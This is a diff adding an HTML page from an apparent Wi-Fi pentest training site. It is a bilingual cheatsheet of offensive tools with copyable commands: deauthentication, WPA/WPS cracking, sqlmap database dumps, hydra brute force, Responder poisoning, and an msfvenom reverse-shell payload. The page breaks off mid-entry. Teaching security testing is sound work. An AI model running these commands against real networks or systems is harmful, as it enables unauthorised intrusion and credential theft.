@@ -1,0 +1,403 @@
+<!-- ARSENAL — Catálogo de Ferramentas com Cheatsheets -->
+<div class="container" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
+
+    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
+        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
+    </div>
+
+    <div class="section-header" style="text-align: left; margin-bottom: var(--space-8);">
+        <h1><i class="fa-solid fa-toolbox" style="color: var(--accent-primary);"></i> <span data-lang-pt>Arsenal de Ferramentas</span><span data-lang-en>Tool Arsenal</span></h1>
+        <p class="text-muted" style="font-size: var(--fs-md); margin-top: var(--space-2);">
+            <span data-lang-pt>Referência rápida de todas as ferramentas usadas no pentest Wi-Fi com cheatsheets e comandos essenciais.</span>
+            <span data-lang-en>Quick reference for all Wi-Fi pentest tools with cheatsheets and essential commands.</span>
+        </p>
+    </div>
+
+    <!-- Search -->
+    <div class="search-box" style="max-width: 400px; margin-bottom: var(--space-8);">
+        <i class="fa-solid fa-search"></i>
+        <input type="text" placeholder="Buscar ferramenta..." data-search-target=".tool-entry" id="tool-search">
+    </div>
+
+    <!-- Tools Grid -->
+    <div class="accordion-group">
+
+        <!-- AIRCRACK-NG SUITE -->
+        <div class="accordion-item tool-entry" data-search-text="aircrack-ng suite crack wpa wpa2 wep password key">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem;"><i class="fa-solid fa-wifi"></i></div>
+                    <div>
+                        <strong style="font-family: var(--font-mono);">aircrack-ng</strong>
+                        <span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Suite Completa</span><span data-lang-en>Full Suite</span></span>
+                    </div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Suite principal para auditoria de segurança Wi-Fi. Inclui ferramentas para monitor mode, captura, injeção e cracking.</span><span data-lang-en>Main suite for Wi-Fi security auditing. Includes tools for monitor mode, capture, injection and cracking.</span></p>
+                <h4 style="margin: var(--space-4) 0 var(--space-2); color: var(--accent-primary);">Cheatsheet</h4>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo airmon-ng check kill</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo airmon-ng start wlan0</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo airodump-ng wlan0mon</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo airodump-ng -c [CH] --bssid [MAC] -w capture wlan0mon</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>aircrack-ng -w wordlist.txt -b [AP_MAC] capture-01.cap</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <p class="text-xs text-muted" style="margin-top: var(--space-3);"><span data-lang-pt>Usado nas trilhas:</span><span data-lang-en>Used in trails:</span> <a href="#/wpa2">WPA2</a>, <a href="#/wps">WPS</a>, <a href="#/eviltwin">Evil Twin</a>, <a href="#/pmkid">PMKID</a></p>
+            </div></div>
+        </div>
+
+        <!-- HASHCAT -->
+        <div class="accordion-item tool-entry" data-search-text="hashcat gpu crack password hash brute force mask rule">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-purple-rgb), 0.1); color: var(--accent-purple);"><i class="fa-solid fa-microchip"></i></div>
+                    <div>
+                        <strong style="font-family: var(--font-mono);">hashcat</strong>
+                        <span class="badge badge-tool" style="margin-left: var(--space-2);">Cracking (GPU)</span>
+                    </div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>O mais rápido cracker de senhas do mundo. Usa GPU para processar milhões de hashes por segundo.</span><span data-lang-en>The world's fastest password cracker. Uses GPU to process millions of hashes per second.</span></p>
+                <h4 style="margin: var(--space-4) 0 var(--space-2); color: var(--accent-primary);">Cheatsheet</h4>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>hashcat -m 22000 hash.hc22000 wordlist.txt --force</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>hashcat --show -m 22000 hash.hc22000</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="info-box info-info" style="margin-top: var(--space-3);">
+                    <i class="fa-solid fa-lightbulb"></i>
+                    <span><code>?d</code>=digit, <code>?l</code>=lower, <code>?u</code>=upper, <code>?s</code>=special, <code>?a</code>=all | <code>-a 0</code>=dict, <code>-a 3</code>=mask, <code>-a 6</code>=hybrid</span>
+                </div>
+            </div></div>
+        </div>
+
+        <!-- HCXDUMPTOOL -->
+        <div class="accordion-item tool-entry" data-search-text="hcxdumptool pmkid capture clientless">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-secondary-rgb), 0.1); color: var(--accent-secondary);"><i class="fa-solid fa-magnet"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">hcxdumptool</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">PMKID Capture</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Captura PMKID sem precisar de clientes conectados. Ferramenta essencial para o ataque PMKID moderno.</span><span data-lang-en>Captures PMKID without needing connected clients. Essential tool for modern PMKID attacks.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=filter.txt --filtermode=2</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- HCXPCAPNGTOOL -->
+        <div class="accordion-item tool-entry" data-search-text="hcxpcapngtool convert cap pcapng hc22000">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem;"><i class="fa-solid fa-arrows-rotate"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">hcxpcapngtool</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Conversão</span><span data-lang-en>Conversion</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Converte arquivos .cap/.pcapng para o formato .hc22000 usado pelo Hashcat.</span><span data-lang-en>Converts .cap/.pcapng files to .hc22000 format used by Hashcat.</span></p>
+                <div class="command-box"><code>hcxpcapngtool -o hash.hc22000 capture.pcapng</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- REAVER -->
+        <div class="accordion-item tool-entry" data-search-text="reaver wps pin brute force pixie dust">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-warning-rgb), 0.1); color: var(--accent-warning);"><i class="fa-solid fa-key"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">reaver</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">WPS Attack</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Brute force do PIN WPS. Inclui suporte ao ataque Pixie Dust para cracking instantâneo.</span><span data-lang-en>WPS PIN brute force. Includes Pixie Dust attack support for instant cracking.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo reaver -i wlan0mon -b [BSSID] -c [CH] -vv</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo reaver -i wlan0mon -b [BSSID] -c [CH] -vv -K</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>sudo reaver -i wlan0mon -b [BSSID] -c [CH] -vv -d 2 -l 1</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <p class="text-xs text-muted" style="margin-top: var(--space-2);"><code>-K</code> = Pixie Dust | <code>-d</code> = delay | <code>-l</code> = lock delay</p>
+            </div></div>
+        </div>
+
+        <!-- BULLY -->
+        <div class="accordion-item tool-entry" data-search-text="bully wps pin alternative">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-warning-rgb), 0.1); color: var(--accent-warning);"><i class="fa-solid fa-hammer"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">bully</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">WPS Alternative</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Alternativa ao Reaver para WPS brute force. Melhor compatibilidade com alguns chipsets.</span><span data-lang-en>Reaver alternative for WPS brute force. Better compatibility with some chipsets.</span></p>
+                <div class="command-box"><code>sudo bully wlan0mon -b [BSSID] -c [CH] -v 3</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- WASH -->
+        <div class="accordion-item tool-entry" data-search-text="wash wps scan detect enabled locked">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem;"><i class="fa-solid fa-magnifying-glass"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">wash</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">WPS Scanner</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Detecta redes com WPS ativo e mostra se está bloqueado.</span><span data-lang-en>Detects WPS-enabled networks and shows lock status.</span></p>
+                <div class="command-box"><code>sudo wash -i wlan0mon</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- WIFITE2 -->
+        <div class="accordion-item tool-entry" data-search-text="wifite wifite2 automated all-in-one auto attack">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-pink-rgb), 0.1); color: var(--accent-pink);"><i class="fa-solid fa-wand-magic-sparkles"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">wifite2</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Automação</span><span data-lang-en>Automation</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Automatiza todo o fluxo de ataque Wi-Fi. Excelente para iniciantes e testes rápidos.</span><span data-lang-en>Automates the entire Wi-Fi attack flow. Excellent for beginners and quick tests.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo wifite</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>sudo wifite --wps --pixie</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- AIRGEDDON -->
+        <div class="accordion-item tool-entry" data-search-text="airgeddon all-in-one bash script menu">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-pink-rgb), 0.1); color: var(--accent-pink);"><i class="fa-solid fa-dragon"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">airgeddon</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">All-in-One</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Script bash multi-uso com interface de menu interativo. Cobre WPA, WPS, Evil Twin, DoS e mais.</span><span data-lang-en>Multi-purpose bash script with interactive menu. Covers WPA, WPS, Evil Twin, DoS and more.</span></p>
+                <div class="command-box"><code>sudo bash airgeddon.sh</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- FLUXION -->
+        <div class="accordion-item tool-entry" data-search-text="fluxion evil twin social engineering fake ap automated">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-danger-rgb), 0.1); color: var(--accent-danger);"><i class="fa-solid fa-ghost"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">fluxion</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">Evil Twin</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Automatiza ataques Evil Twin com captive portal. Cria AP falso, DHCP, DNS e página de phishing automaticamente.</span><span data-lang-en>Automates Evil Twin attacks with captive portal. Creates fake AP, DHCP, DNS and phishing page automatically.</span></p>
+                <div class="command-box"><code>sudo fluxion</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- NMAP -->
+        <div class="accordion-item tool-entry" data-search-text="nmap network scanner reconnaissance active discovery port vuln scan">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-secondary-rgb), 0.1); color: var(--accent-secondary);"><i class="fa-solid fa-search"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">nmap</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Escaneamento</span><span data-lang-en>Network Scanner</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Mapeador de redes e scanner de portas universal. Permite descobrir serviços, versões e falhas de segurança.</span><span data-lang-en>Universal network mapper and port scanner. Enables discovery of active services, versions, and security vulnerabilities.</span></p>
+                <h4 style="margin: var(--space-4) 0 var(--space-2); color: var(--accent-primary);">Cheatsheet</h4>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>nmap -sn 192.168.1.0/24</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>nmap -sS -sV -O 192.168.1.100</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>nmap -p- -T4 192.168.1.100</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>nmap --script vuln 192.168.1.100</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- METASPLOIT -->
+        <div class="accordion-item tool-entry" data-search-text="metasploit framework msfconsole msfvenom exploit exploit shell payload reverse">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-danger-rgb), 0.1); color: var(--accent-danger);"><i class="fa-solid fa-skull"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">metasploit</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Framework</span><span data-lang-en>Exploitation</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Plataforma para desenvolvimento e execução de códigos de exploração contra sistemas remotos.</span><span data-lang-en>Platform for developing and executing exploit code against remote targets.</span></p>
+                <h4 style="margin: var(--space-4) 0 var(--space-2); color: var(--accent-primary);">Cheatsheet</h4>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>msfconsole -q</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o payload.exe</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>db_nmap -sV [IP]</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- GOBUSTER -->
+        <div class="accordion-item tool-entry" data-search-text="gobuster dir dns vhost directory discovery paths brute force">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-pink-rgb), 0.1); color: var(--accent-pink);"><i class="fa-solid fa-folder-tree"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">gobuster</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Recon Web</span><span data-lang-en>Web Discovery</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Varredura rápida de diretórios, arquivos, subdomínios e vhosts usando listas de palavras.</span><span data-lang-en>Fast scanner for directories, files, subdomains, and vhosts using wordlists.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>gobuster dir -u http://example.com/ -w wordlist.txt</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>gobuster dns -d example.com -w subdomains.txt</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- SQLMAP -->
+        <div class="accordion-item tool-entry" data-search-text="sqlmap sql injection database dump tables blind extraction">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-pink-rgb), 0.1); color: var(--accent-pink);"><i class="fa-solid fa-database"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">sqlmap</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Exploração SQLi</span><span data-lang-en>SQLi Exploit</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Ferramenta automática para detecção e exploração de falhas de injeção SQL em aplicações web.</span><span data-lang-en>Automated tool for detecting and exploiting SQL injection flaws in web applications.</span></p>
+                <h4 style="margin: var(--space-4) 0 var(--space-2); color: var(--accent-primary);">Cheatsheet</h4>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sqlmap -u "http://example.com/index.php?id=1" --dbs --batch</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sqlmap -u "http://example.com/index.php?id=1" -D database_name --tables --batch</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>sqlmap -u "http://example.com/index.php?id=1" -D database_name -T users --dump --batch</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- HYDRA -->
+        <div class="accordion-item tool-entry" data-search-text="hydra brute force password crack online ssh ftp rdp vnc">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-warning-rgb), 0.1); color: var(--accent-warning);"><i class="fa-solid fa-key"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">hydra</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Brute Force</span><span data-lang-en>Online Crack</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Quebrador de login online multi-protocolo extremamente rápido.</span><span data-lang-en>Extremely fast multi-protocol online logon cracker.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>hydra -l admin -P passwords.txt ssh://[IP]</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>hydra -L users.txt -P passwords.txt ftp://[IP] -t 16</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- BURP SUITE -->
+        <div class="accordion-item tool-entry" data-search-text="burpsuite burp proxy intercept web crawler fuzzing scanner">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-pink-rgb), 0.1); color: var(--accent-pink);"><i class="fa-solid fa-glass-water"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">burpsuite</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Web Proxy</span><span data-lang-en>Intercept Proxy</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Proxy de interceptação para auditorias em aplicações web. Permite analisar, alterar e repetir pacotes HTTP/S.</span><span data-lang-en>Intercepting proxy server for auditing web applications. Inspect, modify, and replay HTTP/S traffic.</span></p>
+                <p class="text-sm text-muted"><span data-lang-pt>Configuração típica: Definir proxy do navegador para <code>127.0.0.1:8080</code>.</span><span data-lang-en>Typical setup: Point browser proxy settings to <code>127.0.0.1:8080</code>.</span></p>
+            </div></div>
+        </div>
+
+        <!-- RESPONDER -->
+        <div class="accordion-item tool-entry" data-search-text="responder ad active directory poisoning llmnr nbt-ns hashes">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-purple-rgb), 0.1); color: var(--accent-purple);"><i class="fa-solid fa-fingerprint"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">responder</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">AD Recon</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Envenenador de respostas LLMNR, NBT-NS e MDNS para captura de hashes em redes locais (Active Directory).</span><span data-lang-en>LLMNR, NBT-NS, and MDNS responder to poison naming queries and capture credentials in Windows networks (AD).</span></p>
+                <div class="command-box"><code>sudo responder -I eth0 -dwv</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- BETTERCAP -->
+        <div class="accordion-item tool-entry" data-search-text="bettercap mitm man-in-the-middle arp spoofing network">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-danger-rgb), 0.1); color: var(--accent-danger);"><i class="fa-solid fa-user-secret"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">bettercap</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">MITM / Recon</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Framework Swiss-Army para ataques MITM, sniffing, ARP spoofing e reconhecimento de rede.</span><span data-lang-en>Swiss-Army framework for MITM attacks, sniffing, ARP spoofing and network reconnaissance.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo bettercap -iface wlan0mon</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>wifi.recon on</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>wifi.deauth [BSSID]</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- WIRESHARK -->
+        <div class="accordion-item tool-entry" data-search-text="wireshark packet analysis capture protocol dissect">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-secondary-rgb), 0.1); color: var(--accent-secondary);"><i class="fa-solid fa-microscope"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">wireshark</strong><span class="badge badge-tool" style="margin-left: var(--space-2);"><span data-lang-pt>Análise de Pacotes</span><span data-lang-en>Packet Analysis</span></span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Analisador de protocolos de rede mais usado do mundo. Essencial para inspecionar capturas .cap e entender tráfego 802.11.</span><span data-lang-en>World's most used network protocol analyzer. Essential for inspecting .cap captures and understanding 802.11 traffic.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>wireshark capture-01.cap</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>tshark -r capture-01.cap -Y "eapol" -T fields -e wlan.sa</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <p class="text-xs text-muted" style="margin-top: var(--space-2);"><span data-lang-pt>Filtro útil: <code>eapol</code> para ver handshakes | <code>wlan.fc.type_subtype == 0x0c</code> para deauths</span><span data-lang-en>Useful filter: <code>eapol</code> for handshakes | <code>wlan.fc.type_subtype == 0x0c</code> for deauths</span></p>
+            </div></div>
+        </div>
+
+        <!-- KISMET -->
+        <div class="accordion-item tool-entry" data-search-text="kismet wireless detection ids monitoring mapping">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem;"><i class="fa-solid fa-satellite"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">kismet</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">WIDS / Recon</span></div>
+                </div>
+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Sistema de detecção de intrusão wireless e sniffer passivo. Detecta redes ocultas e mapeia dispositivos.</span><span data-lang-en>Wireless intrusion detection system and passive sniffer. Detects hidden networks and maps devices.</span></p>
+                <div class="command-box"><code>sudo kismet -c wlan0mon</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+            </div></div>
+        </div>
+
+        <!-- MDK4 -->
+        <div class="accordion-item tool-entry" data-search-text="mdk3 mdk4 dos flood beacon authentication">
+            <button class="accordion-trigger">
+                <div class="flex items-center gap-3">
+                    <div class="tool-card-icon" style="width: 36px; height: 36px; font-size: 1rem; background: rgba(var(--accent-danger-rgb), 0.1); color: var(--accent-danger);"><i class="fa-solid fa-bomb"></i></div>
+                    <div><strong style="font-family: var(--font-mono);">mdk4</strong><span class="badge badge-tool" style="margin-left: var(--space-2);">DoS / Stress</span></div>
+                </div>
